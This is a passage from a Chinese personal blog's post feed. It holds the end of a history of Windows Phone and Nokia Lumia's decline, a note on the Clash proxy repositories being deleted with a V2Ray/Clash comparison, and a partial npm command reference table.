的优势是相当明显的。</p><p>然而系统无论怎么好看，最终还是要给用户使用的。可惜，它无法建立起应用生态，甚至连基本的功能都有所缺失。理念超前，生态不好，WP 系统的结局仿佛已可以预见。</p><h3 id="惨不忍睹的决策">惨不忍睹的决策</h3><p>微软这个时候出了一个大昏招。营销出身的鲍尔默恰恰在这个时候接手了微软，此后一系列的决策惨不忍睹。</p><p>客观地说，Windows Phone 7 发布之初被大规模抨击的缺点，比如缺少复制粘贴功能并不算是非常严重。至少，iPhone 初代发布的时候，也没有复制粘贴和多任务。但是，iPhone 在 2007 年可以有这些缺点，迟到 3 年的 Windows Phone 7 不行，因为它是后来者。</p><p>微软选择 iPhone 竞争不只是在消费者面前有问题，也没法说服厂商。第三方厂商使用 Android 不需要缴纳授权费，而微软对每一台 Windows Phone 都收数十美元的授权费。</p><p>同时，厂商不能调整 Windows Phone 的界面——微软将统一的设计作为与 iPhone 竞争的重点。结果是任何品牌的 Windows Phone 7 手机都一个样，几乎没有任何区别。手机厂商不会将无法凸显自己差异化的平台当作主力。</p><p>如果说这些还不至于流失大量用户，那么，2010 年微软发布的基于 Windows<br>CE 内核的 Windows Phone 7 便“完美地”补了一刀。它采用了颠覆性的 Metro UI（后称 Modern UI），但由于内核更换，现有的 Windows Mobile 6.5 机型无法升级。</p><p>微软的 WP7 发布之出便抛弃了老用户，而且系统还跟个半成品一样，用户体验很差。在这一时候，微软手机的用户数量开始不断下滑。</p><p>当时的 Android 系统和 iOS 系统在手机市场已经绘声绘色。与此同时，老旧的 Symbian 系统面对 Android 系统以及 iOS 系统颓势尽显，市场份额不断地被挤压。此时的诺基亚似乎也意识到如果继续依靠 Symbian 系统已经无法挽救诺基亚当时的颓势，然而一向高傲的诺基亚却坚持不肯采用作为竞争对手的 Android 系统。</p><p>2010 年 10 月，Android 的市场占有率已经达到 30%。选择和 iPhone 竞争，微软失去了抢夺 Android 客户的机会。</p><h3 id="与-NOKIA-合作的开始">与 NOKIA 合作的开始</h3><p>2011 年 2 月 11 日下午，微软终于拉到了一个全力以赴的重量级合作伙伴——诺基亚。当时微软最新的 Windows Phone 7 系统也成为诺基亚的主要手机操作系统，诺基亚后续机型也将继续使用 Windows Phone 系统。</p><p>即使当时的诺基亚已经在走下坡路，但其市场份额依然是全球第一，凭借着诺基亚强大的品牌影响力，WP 用户迎来了一小波上升。签署合作协议之后，诺基亚很快就发布了 Lumia 800、Lumia 900 等机型。到 2012 年年底，Windows Phone 系统的份额达到 3.9％，虽然与目标的 20% 相距不小，但却是一个好的开端。</p><p><img src="https://s2.loli.net/2023/11/11/VFHtlCfdr5G8juo.png" alt="【Lumia800】" title="【Lumia800】"></p><p>在和微软合作之前，诺基亚曾和 Google 进行过加入 Android 阵营的谈判，但 Google 不愿意给诺基亚特惠。</p><p>遗憾的是，诺基亚当时可能根本没意识到与微软合作不但不会帮它，还会拖慢它的速度。</p><h3 id="WP7-设计团队的昏招">WP7 设计团队的昏招</h3><p>负责 WP7 Metro UI 的是微软设计总监 Flora，选了格子界面的所谓 Metro 风格。不幸的是，使用 Metro 风格的 Zune（微软曾经发布的一款 MP3 播放器），被市场证明是惨败于苹果的。最好的时候，Zune 在美国市场份额是 9%，iPod 当时是 63%，而到了 2011 年 5 月，iPod 的北美市场份额 76%，Zune 还不到 1%。Albert Shum 担任微软移动设计团队主管。他除了负责 WP7 的设计，还负责已经被人遗忘的 KIN 系列手机的设计。</p><p><img src="https://s2.loli.net/2023/11/11/9Slsfx2nmBIKGUQ.jpg" alt="【Zune】" title="【Zune】"></p><p>WP7 项目开始于 2008 年 11 月，新的主管来到，直接废掉了开发了一年多的 Windows Mobile 7，并要求在一年以内拿出产品 这个产品就是 WP7，因为一年时间的紧张限制，微软使用了大量以前的成果。Windows Phone 团队高级体验设计师 MichaelKruzeniski 说：“我们围绕 Kin 打造了很多出色的东西。这款产品虽然已经停售……但它的绝大部分已经被直接或间接地整合进 Windows Phone。”</p><p>就是这样一个被市场证明失败的团队打造了 WP7 系统，打造了 WP7 的体验。所以 WP7 的早期体验非常糟糕，相比 WM 也是一个大倒退。当时 WP7 被吐槽的包括没有流量控制功能、只能用 Zune 同步音乐和图片，没有 USB 传输功能，也没有蓝牙或 WiFi 传输、没有 USB 存储功能、没有第三方中文输入法、重力感应无法关闭、音量无法单独调节等等。WP7 的早期版本基本就是一个半成品。</p><p>而更糟的是微软学习了 iOS 的封闭经验，几乎不允许第三方改动什么东西。让糟糕的原生的体验不能通过第三方开发来弥补。同时，WP7 还废掉了多年积累的 WM 生态体统，需要重建一套自己的生态系统。相比同期的 IOS 和安卓，WP7 的体验差距实在是太大了，营销出身的鲍尔默无论如何努力都难获得销量。</p><h2 id="Windows-Phone-8，生死攸关的决定">Windows Phone 8，生死攸关的决定</h2><h3 id="WP7-不能升级-WP8？！">WP7 不能升级 WP8？！</h3><p><img src="https://s2.loli.net/2023/11/11/LkNK2j7Vuh5dwzX.png" alt="【Win8 与 WP8】" title="【Win8 与 WP8】"></p><p>【注：图中的桌面系统实际上是 Win8.1。Win8 设计超前两步成了先烈，这里就不鞭尸了】</p><p>2011 年合作刚开始，微软的 Windows Phone 系统更新突然停了下来。一直到 2012 年夏天，Windows Phone 8 发布。</p><p>微软骄傲地宣布，Windows Phone 8 是一个全新的开始，放弃了 Windows CE 核心，使用和 Windows8 一样的 Windows NT，未来 Windows 上的应用能直接通用，手机和 PC 能无缝协作。</p><p>但是，由于操作系统的内核改变，WP8 不支持所有的 WP 7.X 升级系统，因为驱动无法兼容。当时消息一传出，各处 WP 用户都在讨论旧机型能不能升级，包括微软在内，给出的结果都是模棱两可的。最终尘埃落定，不能升级，而是给 WP7.X 了一个安慰性更新——WP 7.8。</p><p>当时已有华为、中兴、三星、HTC、LG 等品牌与微软合作推出了搭载 WP7 的手机，这操作下来，等于说它们的心血付之东流，软件开发者更是——谁会买一部一眼望到头的手机呢？值得一提的是，当时第一批 WP7 手机上市不足两年；WP8 开发者大会召开十月前 Lumia900 刚刚发布，国行版更是六月才正式上市。</p><p>WP8 放弃了 WP7 用户，wp7 的粉丝必须购买新设备才能使用当时最前沿的 wp8。这个举动让原本庞大的粉丝群数量骤减，甚至直接导致了 wp8 的衰落。抛弃旧用户，新用户又不买账，这无疑是赔了夫人又折兵。</p><p>当时，搭载 WP7 系统的设备大概有几百万用户。于是，Lumia 820、Lumia 920 先后面世，2.5D 弧面玻璃、卡尔蔡司认证镜头、无线座充等超前的功能设计，把诺基亚多年来沉淀的工艺设计发挥得淋漓尽致。这些操作下来，挽回了一部分用户。之后的 Lumia 720、Lumia 520、Lumia 1020（尤其是其相机）等也受到了不小的好评。</p><h3 id="时局的变换">时局的变换</h3><p>同期的 Android 和 iOS 系统也在不断扩充自己的份额，尽管诺基亚很努力的做手机，却依旧无法挽救 Windows Phone 落败的局面。WP 的口碑和生态继续下滑。</p><p>iPhone 推出之初，诺基亚、黑莓、微软都公开嘲讽这个竞争对手。但背地里，诺基亚和黑莓的管理层已经行动起来。诺基亚提高了触屏 Linux 操作系统 Maemo 的优先级，黑莓也在 2008 年拿出触屏手机 Storm 反击。最终这两个不太会做平台和软件的手机厂商没能追上苹果和 Google。</p><p>而微软有更强大的软件工程能力和平台经验（Windows 就是曾经最大的平台），却不紧不慢地推进着 Windows 手机，甚至让移动系统的研发停下来等 Windows 8。</p><p>诺基亚最讽刺的产品可能是 2012 年推出的拍照手机 Pureview 808——有着 4100 万像素的巨大传感器。在宣布放弃 Symbian、转投 Windows 一年后，诺基亚用 Symbian 系统做了这样一款产品。原因？微软 Windows Phone 8 没来，不支持相机模块所需要的处理器。</p><p><img src="https://s2.loli.net/2023/11/11/iv2lhOoVKycp97I.png" alt="【nokia808】" title="【nokia808】"></p><p>一系列失败，微软失去的机会价值 6000 亿美元</p><h3 id="API-升级，软件更新请重来">API 升级，软件更新请重来</h3><p>在 WP8 更换内核后，WP8.1 又更换了 API，导致第三方应用如果要更新的话，只能重新开发，加大了工作量，而对于 WP 平台而言，第三方开发者多为个人或者小工作室，于是，他们选择离开……</p><h3 id="恶性循环">恶性循环</h3><p>在产品刚刚起步的紧要关头，为什么微软会再一次推倒重来，把重点放在内核上？</p><p>微软公司内部，是按照产品线区分部门，并且每个部门都有自己的市场和销售，有单独的营收数字。这样的结构下，赚钱多的部门话语权自然就大。</p><p>微软的移动业务原本属于 Windows Phone 团队。但当移动成为趋势以后，Windows 部门想要介入。这时，微软做手机的优先级从快速完善产品追赶 Android 和 iPhone，变成了与 PC 业务配合——用一个统一的 Windows8 操作系统覆盖手机和 PC。</p><p>但是，微软却没有对 WP 的体验和生态做出改变，后来的 WP8 居然坚持了 WP7 的设计风格。而这时时间窗口已经开始逐渐关闭。此时，IOS 和安卓开始一统天下。形成良性循环。而 WP 处于恶性循环之中，体验糟糕，销量少，第三方不给开发，生态建立不起来，体验更糟糕。</p><p>而诺基亚等待 Windows Phone 8 的两年里，iPhone 销量翻了三倍、Android 翻了六倍多。</p><h2 id="姗姗来迟的-Windows-10-Mobile">姗姗来迟的 Windows 10 Mobile</h2><h3 id="旗舰机的长期缺失">旗舰机的长期缺失</h3><p>话说自从诺基亚推出 Lumia930 以后，有多久没有发旗舰了，并且这个 Lumia930 还是半年前 Lumia929 的国际版！可以说从 2013 年下半年到 2015 年末，微软竟然没推出一款真正意义上的旗舰！微软意识到低端设备对 WP 系统的意义，可以靠性价比提高出货量，获取更多的用户，这个思路是对的，但是也要适可而止啊，别一条道上走黑啊，说好的旗舰呢？</p><p>别说国内厂商一年 12 场发布会，连一向高傲的苹果都放弃了一年一机的战略，从一年双旗舰变成今年春季就开始一反常态的推出新款机型。微软两年的时间，除了几款不痛不痒的中低端手机，竟然一直保持沉默……</p><h3 id="WP10-全新的功能">WP10 全新的功能</h3><p>2014 年 11 月 11 日，旗舰手机 Lumia 940 发布，微软宣布使用 Windows Phone 10 为该手机的操作系统；12 月 11 日，微软宣布 Windows Phone 10 首个新功能–交互式动态磁贴。2015 年 1 月 22 日，微软将 Windows Phone 10 更名为 Windows 10 for Phone;2 月 13 日，微软正式向部分手机公开推送 Windows 10 Technical Previewfor Phone;5 月 14 日，微软确定将 Windows 10 移动版命名为&quot;Windows 10 Mobile&quot; 。2016 年 3 月 18 日，Windows 10 Mobile 版本 1511 的正式版首次发布 ;8 月 17 日，Windows 10 Mobile 版本 1607 的正式版首次发布 。2017 年 11 月 14 日，Windows 10 Mobile 版本 1709 的正式版首次发布。</p><p>或许是于是 WP 系统应用生态太差的原因，微软为 Windows 10 Mobile 定制了全新的应用商店，与 Windows 10 PC 应用商店统一，开发者可以同时发布智能手机、桌面版 UWP 应用，且 UWP 应用性能更强，使用起来更加顺畅。应用商店也引入了更加直观的应用分类、应用呈现方式，幻灯片滚动推荐最新或优质应用，另外针对已经升级到 UWP 的应用标注&quot;为 Windows 10 生成&quot;，方便用户下载最合适的应用更新版本。</p><p>正如此前微软 Lumia 532 所泄露的信息一样，Windows10 系统手机版本彻底贯彻了微软系统&quot;全平台一体化&quot;的主旨，被正式命名为 Windows10 for Phone 系统。同时新系统相比过去进行了较大的改动，拥有全新的开始屏幕，并采用了整张背景图片设计，而动态磁贴则保留了 WP8.1 上的大部分功能。而如果用户向左滑动开始屏幕，则将出现应用列表新增排序功能，并加入 Win8 系统所具备的最近使用或者按时间排序等功能。</p><p>不仅如此，Win10 手机系统的通知中心与 Win10 电脑版还可以实现无缝链接，并且快速操作也可以折叠或是加入更多选项。至于新系统的设置方面，则相比过去分类更加简洁，可分为折叠和分组管理，用户使用起来可谓一目了然。除此之外，可交互通知操作功能则使得诸如短信操作，可以直接在状态栏接通或者回复，较之过去更快速便捷。至于可缩放的移动键盘和语音输入法，不仅可以解决单手输入的问题，而且使用起来也更方便。</p><p>同时，有消息传出，Windows 10 Mobile 的 10240 固件中有 AOW 环境，其中含有几个配置文件和一个镜像文件。这个镜像文件解包后会得到一个几乎完整的 Android4.4.4 的系统，包含了安卓的大部分核心文件。西班牙一位大神开发了一套工具，可以将安卓的 APK 安装包转换为 APPX 文件，以达到 WP 运行 APK 的目的。</p><h3 id="无法挽回的过失">无法挽回的过失</h3><p>三年过去，微软正式宣布 Windows 10 大一统计划。同年 7 月，Windows 10 桌面版正式发布。在比桌面版晚了近八个月后，Windows 10 Mobile 正式发布。</p><p>Windows 10 Mobile 使用了与桌面版 Windows 10 相同的内核，可以运行一些与 Windows 10 相同的应用。然而，它又一次抛弃了老用户，老机型又是无法升级——大约是所有 WP 的一半。</p><p>此时的 wp 用户已经少之又少，而频繁的内核更换也使软件的开发难上加难。而软件开发的不容易直接导致了软件生态的缺失，微信无法扫码付款，支付宝是最早的版本，无数软件依旧是 Beta 版本，等等。这些致命的软件缺点直接导致了用户的缺失，因此形成恶性循环。</p><p>wp10 也不是 wp10，而是改名成为了 Windows 10 mobile。用户的软件可以和安装 win10 的电脑同步更新，便有了拉 win10 电脑端用户入坑的动力。而且，uwp 软件的出现，使得软件开发变得十分容易，从而一大批优秀 uwp 的软件应运而生。</p><p>但是，wp10 的一些缺点依旧得不到改正，比如大软件的优化和系统流畅度依旧得不到解决。可以说，wp10 就是微软移动的救命稻草了。然而如今，WP 仅仅成为了用户的情怀，小娜仅剩搜索功能，应用商店显示跑路，无不透露着衰败和凄凉。</p><p>当年微软弄出 uwp 时，wp 用户充满希望，因为很快他们手机的生态将起死回生。然而结果，大家也都看到了，依然不行。</p><h3 id="缓慢的更新速度">缓慢的更新速度</h3><p>不过更确信的是 win10 移动版的研发跟不上，研发团队一如既往的保持和蜗牛进行赛跑。直到 2016 年 3 月中旬，windows 10 mobile 正式版才千呼万唤始出来，还 BUG 不断，这离 2012 年 wp8 发布过了近 4 年！</p><p>相比于 iOS 和 Android，WP 在软件应用数量上也屈指可数，更别提更新速度了。你微软系统更新乱七八糟，到头来用户只会骂我们开发者，而且份额做不起来，没盈利，谁还陪你玩？</p><p>这研发速度和水准，简直……即使如此，微软竟一如作死的重蹈 wp7.5 时的坑，除了少部分新机型外，包括 Lumia920 等旗舰机型都不在升级范围呢。这是第几回抛弃老用户了？再忠心的软粉也架不住这样再三折腾啊！于是，他们纷纷选择了“脱坑”。</p><p>研发跟不上导致的后果就是当作为旗舰的 Lumia950 和 Lumia950XL 发布时，搭载的还是预览版的系统，而这台手机明显就是为了撑场面发布的，除了虹膜扫描技术及 Continuum 稍显逼格外，这两部手机无论从做工还是设计，只能用凑合来形容。</p><p><img src="https://s2.loli.net/2023/11/11/NOH4IWYtrSmcKiU.png" alt="【Lumia950XL】" title="【Lumia950XL】"></p><p>凑合，成为 windows 10 手机最大的标记，无论是系统还是硬件——这与当年 Lumia800 惊艳亮相简直不能同日而语！就这样，采用骁龙 808 处理器的 Lumia950 的定价竟然高达 3999，采用骁龙 810 处理器的 Lumia950XL 定价高达 5499。</p><p>后来 Lumia 950 XL 的售价逐渐下降，甚至出现了“买 950XL 送 950”这样的活动。然而这终究没能挽回用户。随后各大平台下架 Lumia，甚至最终微软官网也没有 Lumia 了。谁还记得当年诺基亚宣布与微软达成战略合作关系时给这系列起名的寓意？作为“诺基亚最后的王牌”，其结局落到如此地步，恐怕是诺基亚当年没能想到的。不过这一结局，意料之外，情理之中。</p><h2 id="今天微软的移动市场">今天微软的移动市场</h2><p>2012 年之后，移动市场已经和微软没什么真正的关系，尽管它花费超过 90 亿美元收购诺基亚。到今天，这笔钱已经被彻底浪费，随着诺基亚来到微软的两万多员工已经被全部裁掉，微软之后也放弃了诺基亚品牌。后来，微软便把移动平台的重心寄托于 Surface，并且大获成功。之后微软也发布过 Surface Duo 折叠手机，但却搭载了安卓系统，且 bug 较多。除了这白花的 72 亿美元，微软还丧失了统治智能手机市场的机会。</p><p>从 2019 年 12 月 10 日开始，Windows 10 移动版用户将不能再收到 Microsoft（微软）新的安全更新、非安全修补程序、免费的协助支持选项或联机技术内容更新。微软会在 2019 年 12 月 10 日为 Windows 10 移动版用户推送最后一次更新，只有升级到 Windows 10 移动版 1709（秋季创意者更新）的设备才会收到，而且支持机型少之又少。</p><p>在终止支持以后，接下来 3 个月将继续为设置和部分应用程序自动或手动创建新的设备备份，到 2020 年 3 月 10 日结束。</p><p>微软将在 2021 年 1 月 12 日停止对 Windows 10 Mobile 上的 Office 应用程序的支持，包括 Word、Excel、PowerPoint、OneNote 四大组件。并表示在此之后相关 Office 软件的下载链接将会被删除，用户无法再通过官方渠道获取，而已安装的用户可继续使用，只是不会再得到任何维护支持，风险自负。</p><p><strong>至此，Windows 移动版的一生画上了句号。</strong></p><p>那么，iOS 与 Android 那边又如何？</p><p>从 2007 年 iPhone 发布至今，苹果靠卖 iPhone 一共获得了 5977 亿美元的收入，这还不包括被 iPhone 带动的 AppStore、平板、手表等其它业务的收入。今天 iPhone 和 Android 每个季度的销量都远远超过 Windows 手机＋PC 的全部销量。苹果和 Google 的市值也都远远超过微软。到了 2021 年 10 月，微软市值重回全球第一；靠着 Office、服务器软件和云计算这些企业服务，微软依然很赚钱。</p><p>微软希望能够做出操作系统的大统一，可市场的反馈却表明，它始终未能革自己的命。凡是不能正常运行传统 x86 软件的 Windows 系统，在市场上总是注定要失败的。用户可能会三五年换一部手机，但三五年换一台电脑的恐怕不多。</p><p>无论如何，微软在移动方面基本上再起不能了。</p><h2 id="结尾">结尾</h2><p>永远太远，我们都承诺不起。沧海桑田，一切都不是曾经。</p><p>Windows 10 Mobile、Windows Phone 、Nokia &amp; Lumia，感谢你们曾经来过！</p><p>Windows 10 X、Surface Pro X、Surface Duo、Surface Neo，未来可期！</p><hr><p>2022 年时我无意翻出老旧手机，在上网查询相关资料时偶然间看到这个系统，在好奇心驱动下进行了解。后将其介绍给友人，不想这也勾起了他的好奇，甚至还去购买了一台（当然，是二手市场上）进行研究（不过我更相信那是用于怀念用的）。在当时我与他都希望能收集资料编个什么东西来“缅怀”下这个超前的系统（虽然更多是用于自己看和装 X），于是整合此文。</p>]]></content>
      
      
      <categories>
          
          <category> 闲聊随写 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
            <tag> 闲聊随写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Clash 删库停更事件</title>
      <link href="/posts/1670947396/"/>
      <url>/posts/1670947396/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>此事件比较魔幻，网络上众说纷纭，具体如何不易得知。仅知继 CFW 停更删库一日后，其他一些第三方客户端乃至内核接连删库归档。网上现只剩下各种备份及各样的分析。关于此事，我仅记录些我获知的内容。</p><h2 id="事件回顾（极简版）">事件回顾（极简版）</h2><p><img src="https://s2.loli.net/2024/10/26/n3JgYjQzEZ1TG4s.png" alt=""></p><p>先是从一个站长论坛得知 Fndroid 在国外平台宣布停止更新，后又在其他论坛或博客上搜索，结合这些网站上的内外截图，才确认 11 月 2 日他删库跑路了。此事事发突然，很多论坛和群里都沸沸扬扬，甚至还上了某博热搜。</p><p>虽然说 CFW 并不开源，它使用的内核 Clash Core Premium 也不开源，但软件停更并不妨碍其继续使用。本想着看看其他的版本，但一天后 Clash Verge 删库，更糟糕的是 ClashCore 、ClashMeta 也删库了，一些比较知名的客户端作者也纷纷将此项目删库或归档。</p><p><img src="https://s2.loli.net/2024/10/26/1zhI4YQUFNnBxLS.png" alt=""></p><p>go-shadow-socks2、Helloworld、Tuic 也删库了，据闻是这几个作者之间有联系，其中有人被请喝茶了，于是明哲保身。具体如何，暂无法确认，不过 CFW 作者 Fndroid 在国外平台上发的些日常记录中的确也暴露了很多个人信息，多到警方乃至普通“黑客”定位他都非常容易。</p><p><img src="https://s2.loli.net/2024/10/26/M35mBzkeupTXWlL.png" alt=""></p><h2 id="一些容易产生误解的东西">一些容易产生误解的东西</h2><p>【亦是网络上获知的，真实度与前面相仿，请谨慎辨别。】</p><ol><li>Clash 和 Clash for windows 等客户端，与订阅节点能否正常使用是无关的（好比斐讯倒了但它的路由器还是可以使用、XiunoBBS 作者放弃了还有开发者维护等等），除非支持解析这个订阅的软件全部没有——但目前来看这个可能性不大，毕竟 SSR 这个协议目前还不少机场使用。</li><li>Fndroid 并没有被控制，他的 CFW 里也没有留下后门（如果他留了后门，那么他应该继续加后门而不是停更让一部分用户放弃使用）。当天 Fndroid 还在和群友聊天、甚至第二天还在正常出门。</li><li>CFW 删库后上了热搜，加上各方来路的信息交汇，其中一些信息不可避免地对很多人进行了误导，致使其在微博热搜、抖音热门、睿站等平台引发大量讨论。Clash 被推上了风口浪尖，Clash 内核及其 UI 客户也跟着归档或者删库，暂避风头，不过这些作者都没被抓。</li><li>软件既然更新了那么多版本，又有那么多人用，Clash 内核也有开源版本，安全性什么的咱暂可不必担心。</li></ol><h2 id="后记">后记</h2><p>祝愿开发者一切安好，期待 Clash 未来回归。</p><p>另外，这种话题最好不要在某博之类的平台上乱发（为了流量而导致事情超出预期的例子，应该不少了吧），这次 Clash 集体删库，和这种的行为脱不开干系；而且发的话容易暴露一些东西（这些截图中，有些若不靠魔法，怎的获取）……总之，多看少说，无论何处都一样。</p><hr><p><strong>V2Ray</strong></p><p>V2Ray 是一个基于 Go 语言开发的科学用网工具，自诞生以来就致力于让大家更好更快地进行科学用网。它是一个平台，任何人都可以使用 V2Ray 提供的模块来搭配出理想的科学用网策略。它的开发团队 Project V 是一个包含一系列构建特定网络环境工具的项目，而 V2Ray 属于最核心的一个。内核（V2Ray）用于实际的网络交互、路由等针对网络数据的处理，而用户界面程序提供了方便直接的操作流程。不过从时间上来说，先有 V2Ray 才有 Project V。（注：现在 V2Ray 已支持 Clash 和 ClashMeta 内核）</p><p>V2Ray 是一个开源项目，具有透明的代码。它专注于 Vmess 协议，这是一种高度安全的代理协议，支持更多的加密和安全特性；它有强大的路由功能，允许进行精确地控制流量的转发；它支持插件系统，可以通过插件实现更多的功能，如流量伪装、混淆等。</p><p><strong>Clash</strong></p><p>Clash 是一个用 Go 语言编写的规则代理工具，支持多种代理协议，如 Shadowsocks、Vmess、Trojan 等。<br>它拥有强大的配置选项，允许用户自定义代理规则，以实现更精细的流量控制和路由设置。<br>由于其受欢迎程度，Clash 有一个活跃的社区，有许多基于图形界面的客户端，有许多使用教程文档。其图标为一只猫，因此也被使用者称为“小猫”。</p><p>V2ray 支持大多数主流的协议，界面较为简单，但正是因为简单，所以基本配置较方便，适合那种只想达成科学用网目录的用户使用。它也不是不可以进行些更高级的配置，但较为复杂。Clash 配置较为繁琐，但能够方便地进行节点负载均衡、分流等操作。</p>]]></content>
      
      
      <categories>
          
          <category> 漫谈杂言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>npm 常用命令整理</title>
      <link href="/posts/88276678/"/>
      <url>/posts/88276678/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="常用-npm-命令">常用 npm 命令</h2><h3 id="包管理">包管理</h3><table><thead><tr><th>命令</th><th>含义</th></tr></thead><tbody><tr><td>npm init -y</td><td>创建 package.json 文件</td></tr><tr><td>npm install 或 npm i</td><td>安装 package.json 中的所有内容</td></tr><tr><td>npm install --production</td><td>安装 package.json 中的所有内容</td></tr><tr><td>（除了 devDependecies)</td><td></td></tr><tr><td>npm install lodash</td><td>安装一个包</td></tr><tr><td>npm install --save-dev lodash</td><td>安装为 devDependency</td></tr><tr><td>npm install --save-exact lodash</td><td>准确安装</td></tr><tr><td>npm install @scope/package-name</td><td>安装一个作用域的公共包</td></tr><tr><td>npm install &lt;package_name&gt;@<tag></td><td>使用 dist-tags 安装包</td></tr><tr><td>npm install -g &lt;package_name&gt;</td><td>全局安装包</td></tr><tr><td>npm uninstall &lt;package_name&gt;</td><td>卸载包</td></tr><tr><td>npm uninstall -g &lt;package_name&gt;</td><td>全局卸载包</td></tr></tbody></table><h3 id="安装包">安装包</h3><table><thead><tr><th>命令</th><th>含义</th></tr></thead><tbody><tr><td>npm i package</td><td>安装 NPM 包<code>package</code></td></tr><tr><td>npm i package@latest</td><td>指定<code>package</code>版本为最新</td></tr><tr><td>npm i package@3.0.0</td><td>指定<code>package</code>版本 3.0.0</td></tr><tr><td>npm i package@“&gt;=1 &lt;2.0”</td><td>指定<code>package</code>版本范围</td></tr><tr><td>npm i @org/package</td><td><code>@org</code>范围内的 NPM 包<code>package</code></td></tr><tr><td>npm i user/repo</td><td>GitHub，安装<code>user/repo</code>下的包</td></tr><tr><td>npm i user/repo#master</td><td>GitHub，安装<code>user/repo</code>下的包</td></tr><tr><td>npm i github:user/repo</td><td>GitHub，安装<code>user/repo</code>下的包</td></tr><tr><td>npm i gitlab:user/repo</td><td>GitLab，安装<code>user/repo</code>下的包</td></tr><tr><td>npm i /path/to/repo</td><td>绝对路径</td></tr><tr><td>npm i ./archive.tgz</td><td>压缩包</td></tr><tr><td>npm i <a href="https://site.com/archive.tgz" rel="external nofollow noreferrer">https://site.com/archive.tgz</a></td><td>通过 HTTP 压缩包</td></tr><tr><td>~~~~~~~~~~</td><td>安装依赖的可用参数</td></tr><tr><td>-P, --save-prod</td><td>包将出现在您的依赖项中，这是默认值 (npm v8)，除非存在 -D 或 -O</td></tr><tr><td>-D, --save-dev</td><td>包会出现在你的 devDependencies 中</td></tr><tr><td>-O, --save-optional</td><td>包将出现在您的 optionalDependencies 中</td></tr><tr><td>–no-save</td><td>防止保存到依赖项</td></tr><tr><td>-E, --save-exact</td><td>依赖项将使用精确的版本进行配置，而不是使用 npm 的默认 semver 范围运算符</td></tr><tr><td>-B, --save-bundle</td><td>依赖项也将添加到您的 bundleDependencies 列表中</td></tr></tbody></table><p>注：</p><ul><li>命令 npm i 是 npm install 的别名</li></ul><h3 id="列举">列举</h3><table><thead><tr><th>命令</th><th>含义</th></tr></thead><tbody><tr><td>npm list</td><td>列出此软件（目录）中所有依赖项的已安装版本</td></tr><tr><td>npm list -g --depth 0</td><td>列出所有全局安装包的安装版本</td></tr><tr><td>npm view</td><td>列出此软件中所有依赖项的最新版本</td></tr><tr><td>npm outdated</td><td>仅列出此软件中已过时的依赖项</td></tr></tbody></table><h3 id="缓存">缓存</h3><table><thead><tr><th>命令</th><th>含义</th></tr></thead><tbody><tr><td>npm cache add <code>&lt;package-spec&gt;</code>或<code>&lt;folder&gt;</code>或<code>&lt;tarball url&gt;</code>或<code>&lt;name&gt;@&lt;version&gt;</code></td><td>将指定的包添加到本地缓存</td></tr><tr><td>npm cache clean [<key>]</td><td>删除缓存文件夹中的所有数据</td></tr><tr><td>npm cache ls [<path>]</td><td>查看现有的 npm 包缓存，如果加上 path 参数，则查看该路径下的文件</td></tr><tr><td>npm cache verify</td><td>验证缓存文件夹的内容，垃圾收集任何不需要的数据，并验证缓存索引和所有缓存数据的完整性</td></tr></tbody></table><p>注：</p><ul><li>用于添加、列出或清理 npm 缓存文件夹</li></ul><h3 id="更新">更新</h3><table><thead><tr><th>命令</th><th>含义</th></tr></thead><tbody><tr><td>npm version <version></td><td>要更改 package.json 中的版本号</td></tr><tr><td>npm update</td><td>更新生产包</td></tr><tr><td>npm update --dev</td><td>更新开发包</td></tr><tr><td>npm update -g</td><td>更新全局包</td></tr><tr><td>npm update lodash</td><td>更新 lodash 包</td></tr></tbody></table><p>查看信息</p><table><thead><tr><th>命令</th><th>含义</th></tr></thead><tbody><tr><td>npm view <package> versions</td><td>查看 package 的所有版本信息</td></tr><tr><td>npm view <package> version</td><td>查看 package 的最新的版本信息</td></tr><tr><td>npm view <package> dependencies</td><td>查看包的依赖关系</td></tr></tbody></table><h3 id="杂项">杂项</h3><table><thead><tr><th>命令</th><th>含义</th></tr></thead><tbody><tr><td>npm owner add USERNAME PACKAGENAME</td><td>将某人添加为所有者</td></tr><tr><td>npm ls</td><td>列出包</td></tr><tr><td>npm deprecate PACKAGE@“&lt; 0.2.0” “critical bug fixed in v0.2.0”</td><td>向安装旧版本软件包的用户添加警告（弃用）</td></tr><tr><td>npm update [-g] PACKAGE</td><td>更新所有包或选定的包</td></tr><tr><td>npm outdated [PACKAGE]</td><td>检查过时的包</td></tr><tr><td>npm info <package></td><td>查看每个模块的具体信息</td></tr></tbody></table><h3 id="发布、更新与可见">发布、更新与可见</h3><table><thead><tr><th>命令</th><th>含义</th></tr></thead><tbody><tr><td>npm publish</td><td>第一次需要指定公开参数。后续发布公开包到 <a href="http://npmjs.org" rel="external nofollow noreferrer">npmjs.org</a></td></tr><tr><td>npm publish --access public</td><td>同上</td></tr><tr><td>npm publish --access public --tag previous</td><td>同上</td></tr><tr><td>npm access restricted <package-name></td><td>将公共包设为私有</td></tr><tr><td>npm access public <package-name></td><td>公开私有包</td></tr><tr><td>npm owner add <user> <your-package-name></td><td>授予私有包访问权限</td></tr><tr><td>npm unpublish <package-name> -f</td><td>取消指定版本</td></tr><tr><td>npm unpublish <package-name>@<version></td><td>同上</td></tr><tr><td>npm init <package-spec></td><td>（如同 `npx <package-spec>)</td></tr><tr><td>npm init &lt;@scope&gt;</td><td>（如同 <code>npx &lt;@scope&gt;/create</code>)</td></tr></tbody></table><p>注：</p><ul><li>npm init 别名：create, innit，例：</li></ul><table><thead><tr><th>命令</th><th>含义</th></tr></thead><tbody><tr><td>npm init foo</td><td>npm exec create-foo</td></tr><tr><td>npm init @usr/foo</td><td>npm exec @usr/create-foo</td></tr><tr><td>npm init @usr</td><td>npm exec @usr/create</td></tr><tr><td>npm init @usr@2.0.0</td><td>npm exec @usr/create@2.0.0</td></tr><tr><td>npm init 